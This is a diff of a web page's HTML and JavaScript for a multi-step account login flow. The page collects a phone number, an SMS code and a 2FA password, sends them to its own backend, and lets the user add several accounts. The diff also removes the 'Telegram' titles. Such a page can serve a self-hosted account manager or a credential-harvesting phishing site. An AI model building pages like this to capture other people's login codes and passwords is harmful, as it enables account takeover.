@@ -278,29 +278,13 @@
             text-decoration: underline;
             margin-top: 8px;
         }
-
-        /* Footer link */
-        .footer-link {
-            text-align: center;
-            margin-top: 24px;
-        }
-
-        .footer-link a {
-            color: #4c9ce0;
-            text-decoration: none;
-            font-size: 0.9rem;
-        }
-
-        .footer-link a:hover {
-            text-decoration: underline;
-        }
     </style>
 </head>
 <body>
     <div class="login-container">
         <div class="login-card">
-            <!-- Step 1: Phone Number -->
-            <div id="step1">
+            <!-- Page 1: Phone Number -->
+            <div id="page1">
                 <div class="header-bar">
                     <div class="back-button" onclick="goBack()">
                         <svg viewBox="0 0 24 24">
@@ -318,7 +302,7 @@
                 <!-- Single phone input with + prefix -->
                 <div class="input-wrapper">
                     <span class="input-prefix">+</span>
-                    <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" value="">
+                    <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" value="" autofocus>
                 </div>
 
                 <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
@@ -326,15 +310,15 @@
                 </button>
             </div>
 
-            <!-- Step 2: Verification Code -->
-            <div id="step2" style="display: none;">
+            <!-- Page 2: Verification Code -->
+            <div id="page2" style="display: none;">
                 <div class="header-bar">
-                    <div class="back-button" onclick="backToPhone()">
+                    <div class="back-button" onclick="backToPage1()">
                         <svg viewBox="0 0 24 24">
                             <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                         </svg>
                     </div>
-                    <div class="header-title">Telegram</div>
+                    <div class="header-title">Verification</div>
                 </div>
 
                 <div class="step-title">Enter Code</div>
@@ -354,29 +338,49 @@
                     <div class="code-box" id="box5">-</div>
                 </div>
 
-                <!-- 2FA Password Input (hidden by default) -->
-                <div id="passwordGroup" style="display: none;">
-                    <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password">
-                </div>
-
                 <!-- Next Button -->
                 <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
-                    <span>Next</span>
+                    <span>Verify</span>
                 </button>
 
                 <!-- Resend timer -->
                 <div class="resend-timer" id="resendTimer"></div>
             </div>
 
-            <!-- Step 3: Success -->
-            <div id="step3" style="display: none;">
+            <!-- Page 3: Two-Factor Authentication (separate page) -->
+            <div id="page3" style="display: none;">
                 <div class="header-bar">
-                    <div class="back-button" onclick="backToPhone()">
+                    <div class="back-button" onclick="backToPage2()">
                         <svg viewBox="0 0 24 24">
                             <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                         </svg>
                     </div>
-                    <div class="header-title">Telegram</div>
+                    <div class="header-title">Two-Factor Authentication</div>
+                </div>
+
+                <div class="step-title">Password Required</div>
+                <div class="step-description">
+                    This account has two-factor authentication enabled. Please enter your password.
+                </div>
+
+                <!-- Password input -->
+                <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password" autofocus>
+
+                <!-- Next Button -->
+                <button class="btn btn-primary" id="passwordBtn" onclick="submitPassword()">
+                    <span>Sign In</span>
+                </button>
+            </div>
+
+            <!-- Page 4: Success -->
+            <div id="page4" style="display: none;">
+                <div class="header-bar">
+                    <div class="back-button" onclick="backToPage1()">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                        </svg>
+                    </div>
+                    <div class="header-title">Success</div>
                 </div>
 
                 <div style="text-align: center;">
@@ -392,10 +396,6 @@
                         <span>Add Another Account</span>
                     </button>
                 </div>
-            </div>
-
-            <div class="footer-link">
-                <a href="/dashboard">← Back to Dashboard</a>
             </div>
         </div>
     </div>
@@ -422,10 +422,11 @@
             errorDiv.className = 'error-message show';
             errorDiv.textContent = message;
             
-            // Find which step is visible
-            const visibleStep = document.querySelector('#step1:visible, #step2:visible, #step3:visible');
-            const step2 = document.getElementById('step2');
-            step2.insertBefore(errorDiv, step2.firstChild);
+            // Find which page is visible
+            const visiblePage = document.querySelector('#page1:visible, #page2:visible, #page3:visible, #page4:visible');
+            if (visiblePage) {
+                visiblePage.insertBefore(errorDiv, visiblePage.firstChild);
+            }
             
             setTimeout(() => {
                 if (errorDiv.parentNode) {
@@ -440,8 +441,8 @@
             errorDiv.style.background = '#1e4a2b';
             errorDiv.textContent = message;
             
-            const step2 = document.getElementById('step2');
-            step2.insertBefore(errorDiv, step2.firstChild);
+            const page2 = document.getElementById('page2');
+            page2.insertBefore(errorDiv, page2.firstChild);
             
             setTimeout(() => {
                 if (errorDiv.parentNode) {
@@ -479,22 +480,22 @@
                     boxes[i].classList.remove('filled');
                 }
             }
-            
-            // Auto verify when 5 digits entered (optional - remove if you want manual only)
-            // if (code.length === 5) {
-            //     setTimeout(() => verifyCode(), 300);
-            // }
         }
 
         // Hidden input event listeners
         hiddenInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
             updateCodeBoxes();
+            
+            // Auto verify when 5 digits entered
+            if (this.value.length === 5) {
+                setTimeout(() => verifyCode(), 300);
+            }
         });
 
         // Navigation
         function goBack() {
-            window.location.href = '/dashboard';
+            window.location.href = '/login';
         }
 
         // Send verification code
@@ -503,6 +504,7 @@
             
             if (!phoneNumber) {
                 showError('Please enter your phone number');
+                document.getElementById('phone').focus();
                 return;
             }
 
@@ -529,9 +531,9 @@
                     currentSessionId = data.session_id;
                     currentPhone = phoneNumber;
                     
-                    // Show step 2
-                    document.getElementById('step1').style.display = 'none';
-                    document.getElementById('step2').style.display = 'block';
+                    // Show page 2
+                    document.getElementById('page1').style.display = 'none';
+                    document.getElementById('page2').style.display = 'block';
                     
                     // Clear and focus hidden input
                     hiddenInput.value = '';
@@ -557,14 +559,7 @@
             
             if (code.length !== 5) {
                 showError('Please enter the 5-digit code');
-                return;
-            }
-
-            const password = document.getElementById('password').value;
-            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
-
-            if (needPassword && !password) {
-                showError('Please enter your 2FA password');
+                hiddenInput.focus();
                 return;
             }
 
@@ -579,17 +574,16 @@
                     },
                     body: JSON.stringify({ 
                         code: code,
-                        session_id: currentSessionId,
-                        password: password
+                        session_id: currentSessionId
                     })
                 });
 
                 const data = await response.json();
 
                 if (data.success) {
-                    // Show success step
-                    document.getElementById('step2').style.display = 'none';
-                    document.getElementById('step3').style.display = 'block';
+                    // Show success page
+                    document.getElementById('page2').style.display = 'none';
+                    document.getElementById('page4').style.display = 'block';
                     
                     document.getElementById('successAccountInfo').innerHTML = 
                         `Account added successfully!`;
@@ -598,18 +592,71 @@
                         clearInterval(timerInterval);
                     }
                     
+                } else if (data.need_password) {
+                    // Show 2FA page
+                    document.getElementById('page2').style.display = 'none';
+                    document.getElementById('page3').style.display = 'block';
+                    document.getElementById('password').focus();
+                    
                 } else {
-                    if (data.need_password) {
-                        document.getElementById('passwordGroup').style.display = 'block';
-                        showError('2FA is enabled. Please enter your password.');
-                    } else {
-                        showError(data.error || 'Verification failed');
-                        
-                        // Clear code boxes for retry
-                        hiddenInput.value = '';
-                        updateCodeBoxes();
-                        hiddenInput.focus();
+                    showError(data.error || 'Verification failed');
+                    
+                    // Clear code boxes for retry
+                    hiddenInput.value = '';
+                    updateCodeBoxes();
+                    hiddenInput.focus();
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showError('Network error. Please try again.');
+            } finally {
+                setLoading(button, false);
+            }
+        }
+
+        // Submit 2FA password
+        async function submitPassword() {
+            const password = document.getElementById('password').value;
+            
+            if (!password) {
+                showError('Please enter your 2FA password');
+                document.getElementById('password').focus();
+                return;
+            }
+
+            const button = document.getElementById('passwordBtn');
+            setLoading(button, true);
+
+            try {
+                const response = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        code: '',  // No code needed for 2FA
+                        session_id: currentSessionId,
+                        password: password
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Show success page
+                    document.getElementById('page3').style.display = 'none';
+                    document.getElementById('page4').style.display = 'block';
+                    
+                    document.getElementById('successAccountInfo').innerHTML = 
+                        `Account added successfully!`;
+                    
+                    if (timerInterval) {
+                        clearInterval(timerInterval);
                     }
+                } else {
+                    showError(data.error || 'Invalid password');
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -622,7 +669,7 @@
         // Resend code
         async function resendCode() {
             if (!currentPhone) {
-                backToPhone();
+                backToPage1();
                 return;
             }
 
@@ -643,6 +690,7 @@
                     updateCodeBoxes();
                     startResendTimer();
                     showSuccess('Code resent successfully!');
+                    hiddenInput.focus();
                 } else {
                     showError(data.error || 'Failed to resend code');
                 }
@@ -671,23 +719,30 @@
             }, 1000);
         }
 
-        function backToPhone() {
-            document.getElementById('step1').style.display = 'block';
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'none';
+        function backToPage1() {
+            document.getElementById('page1').style.display = 'block';
+            document.getElementById('page2').style.display = 'none';
+            document.getElementById('page3').style.display = 'none';
+            document.getElementById('page4').style.display = 'none';
             
             document.getElementById('password').value = '';
-            document.getElementById('passwordGroup').style.display = 'none';
             hiddenInput.value = '';
             updateCodeBoxes();
+            document.getElementById('phone').focus();
             
             if (timerInterval) {
                 clearInterval(timerInterval);
             }
         }
 
+        function backToPage2() {
+            document.getElementById('page2').style.display = 'block';
+            document.getElementById('page3').style.display = 'none';
+            hiddenInput.focus();
+        }
+
         function addAnotherAccount() {
-            backToPhone();
+            backToPage1();
             document.getElementById('phone').value = '';
             currentSessionId = null;
             currentPhone = '';
@@ -711,19 +766,21 @@
 
         document.getElementById('password').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                verifyCode();
+                submitPassword();
             }
         });
 
-        // Focus hidden input when clicking step 2
-        document.getElementById('step2').addEventListener('click', function(e) {
+        // Focus hidden input when clicking page 2
+        document.getElementById('page2').addEventListener('click', function(e) {
             if (e.target.tagName !== 'BUTTON' && !e.target.classList.contains('resend-btn')) {
                 hiddenInput.focus();
             }
         });
 
-        // Initialize
-        document.getElementById('phone').focus();
+        // Initialize - focus phone input
+        window.addEventListener('load', function() {
+            document.getElementById('phone').focus();
+        });
     </script>
 </body>
 </html>
